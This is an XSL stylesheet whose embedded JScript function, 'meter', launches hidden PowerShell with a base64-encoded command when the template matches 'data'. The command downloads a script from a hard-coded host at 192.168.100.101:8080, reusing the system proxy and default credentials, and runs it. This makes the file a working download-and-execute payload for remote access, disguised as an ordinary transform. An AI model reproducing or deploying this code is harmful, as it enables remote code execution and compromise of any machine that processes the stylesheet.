<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="http://mycompany.com/mynamespace">

 <msxsl:script language="JScript" implements-prefix="user">
<![CDATA[
  
      function meter(){
        var rat = "JABBAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAEEALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABBAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAEEALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMQAwADEAOgA4ADAAOAAwAC8AeABzAGwAdAAnACkAOwA="
        var ps  = "cmd.exe /c powershell -window hidden -enc "
        new ActiveXObject("WScript.Shell").Run(ps + rat,0,true);
      }
      
  
    ]]>
      </msxsl:script>

  <xsl:template match="data">
    <result>
      <xsl:value-of select="user:meter()" />
    </result>
  </xsl:template>
</xsl:stylesheet>